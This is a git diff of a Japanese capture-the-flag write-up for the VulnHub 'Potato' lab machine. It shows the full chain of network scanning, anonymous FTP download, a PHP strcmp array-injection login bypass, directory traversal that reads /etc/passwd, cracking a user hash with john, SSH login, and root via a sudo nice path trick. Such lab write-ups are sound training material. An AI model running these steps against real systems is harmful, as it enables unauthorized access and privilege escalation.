@@ -1,9 +1,9 @@
-1.自身のアドレスを調べる
+## 1.自身のアドレスを調べる
 ```bash
 ip a
 ```
 
-2.PotatoマシンのIPアドレスを特定する
+## 2.PotatoマシンのIPアドレスを特定する
 ```bash
 sudo netdiscover -i enp0s3 -r 192.168.56.0/24
 ```
@@ -17,12 +17,12 @@ sudo netdiscover -i enp0s3 -r 192.168.56.0/24
 56.100 ⇒　DHCP<br>
 56.120　⇒　ターゲット
 
-3.実験用ディレクトリ作成
+## 3.実験用ディレクトリ作成
 
 ```
 mkdir vulnhub/potato
 ```
-4.Potatoマシンに疎通確認、ポートスキャン
+## 4.Potatoマシンに疎通確認、ポートスキャン
 ```bash
 ping -c 4 192.168.56.102
 ```
@@ -64,7 +64,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 | ８０| HTTP|
 | ２１１２ | FTP（proFTPD⇒AnonymousFTPでログイン可能）|
 
-5.FTPサービスにアクセスする
+## 5.FTPサービスにアクセスする
 ```bash
 ftp 192.168.56.102 2112
 ```
@@ -96,14 +96,14 @@ ftp> help
 | mput | 複数ファイルアップロード|
 | help| ヘルプを表示|
 
-6.ファイルをダウンロードする
+## 6.ファイルをダウンロードする
 
 今回は２つしかなかったのでまとめてダウンロードした
 ```bash
 mget *
 ```
 
-7.ダウンロードしたファイルを調べる
+## 7.ダウンロードしたファイルを調べる
 ```bash
 #　ファイルの種類
 $file welcome.msg
@@ -154,11 +154,11 @@ if($_GET['login']==="1"){
 </body>
 </html>
 ```
-8.HTTPサービスにアクセスする
+## 8.HTTPサービスにアクセスする
 
 <img width="998" height="504" alt="image" src="https://github.com/user-attachments/assets/2bdd8363-9dc7-42d3-94a6-121a02cdfdc7" />
 
-9.アクセスできるファイルを列挙する
+## 9.アクセスできるファイルを列挙する
 ```bash
 gobuster dir -u 192.168.56.102 -w /usr/share/wordlists/dirb/common.txt
 ```
@@ -195,18 +195,18 @@ Finished
 ```
 <img width="567" height="305" alt="image" src="https://github.com/user-attachments/assets/bce2fb75-790a-4671-b4d1-b0e3ca825365" />
 
-10.ソースの認証部分を読む
+## 10.ソースの認証部分を読む
 ```
 if($_GET['login']==="1"){
   if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
 ```
 strcmp()関数は２つの文字列を比較する<br>
 PHPのstrcmp1()関数は、配列を指定すると使用上のエラーが発生してNULLを返す<br>
-➢　$_POST['password`]を配列にすれば、strcmp($_POST[password],$pass)はNULLを返す
-➢　PHPには「NULL==0」が真（Trrue）になるという、比較における固有の弱点がある
+➢　$_POST['password`]を配列にすれば、strcmp($_POST[password],$pass)はNULLを返す<br>
+➢　PHPには「NULL==0」が真（Trrue）になるという、比較における固有の弱点がある<br>
 ➢　uesrnameに「admin」、paswordに空の配列をセットすればダッシュボードにアクセスできる？？
 
-11.Burpを使う
+## 11.Burpを使う
 
 「アプリケーション」＞「Pentesting」＞「Web Application Analysis」＞「Web Application Proxies」>「Burp suite Community Edition」
 
@@ -225,7 +225,7 @@ username=admin&password[]=test
 
 <img width="316" height="179" alt="image" src="https://github.com/user-attachments/assets/a012f871-d05f-46fb-be49-a45872b621dd" /><br>
 
-12.ディレクトリラバーサル攻撃を仕掛けてみる
+## 12.ディレクトリラバーサル攻撃を仕掛けてみる
 
 <img width="611" height="497" alt="image" src="https://github.com/user-attachments/assets/c5e6cda7-db2d-46f7-a001-171c4a4b2ce5" /><br>
 
@@ -274,7 +274,7 @@ proftpd:x:112:65534::/run/proftpd:/usr/sbin/nologin
 ftp:x:113:65534::/srv/ftp:/usr/sbin/nologin
 webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
 ```
-13.パスワードを解析する
+## 13.パスワードを解析する
 
 passwdファイルにはパスワードハッシュをもつユーザーがいるのでこれでパスワード解析をする
 ```bash
@@ -316,13 +316,13 @@ dragon           (webadmin)　　←　これがパスワード
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
-14.SSH接続をしてみる
+## 14.SSH接続をしてみる
 ```bash
 ssh webadmin@192.168.56.102
 ```
 #password⇒　dragon
 
-15.探索
+## 15.探索
 ```bash
 webadmin@serv:~$ id
 uid=1001(webadmin) gid=1001(webadmin) groups=1001(webadmin)
@@ -361,7 +361,7 @@ drwx------ 2 florianges florianges 4096 Aug  2  2020 .cache
 -rw-r--r-- 1 florianges florianges  807 Feb 25  2020 .profile
 -rw-r--r-- 1 florianges florianges    0 Aug  2  2020 .sudo_as_admin_successful ←　ここに注目！！！
 ```
-16.sudoの設定確認
+## 16.sudoの設定確認
 
 Webadminユーザーがsudoで何ができるかを調べる
 ```bash
@@ -384,7 +384,7 @@ sudo /bin/nice /notes/../bin/bash
 root@serv:/home/florianges#
 ```
 
-17.ルート権限を取得できたのでフラグを探す
+## 17.ルート権限を取得できたのでフラグを探す
 ```
 cd /root
 ```
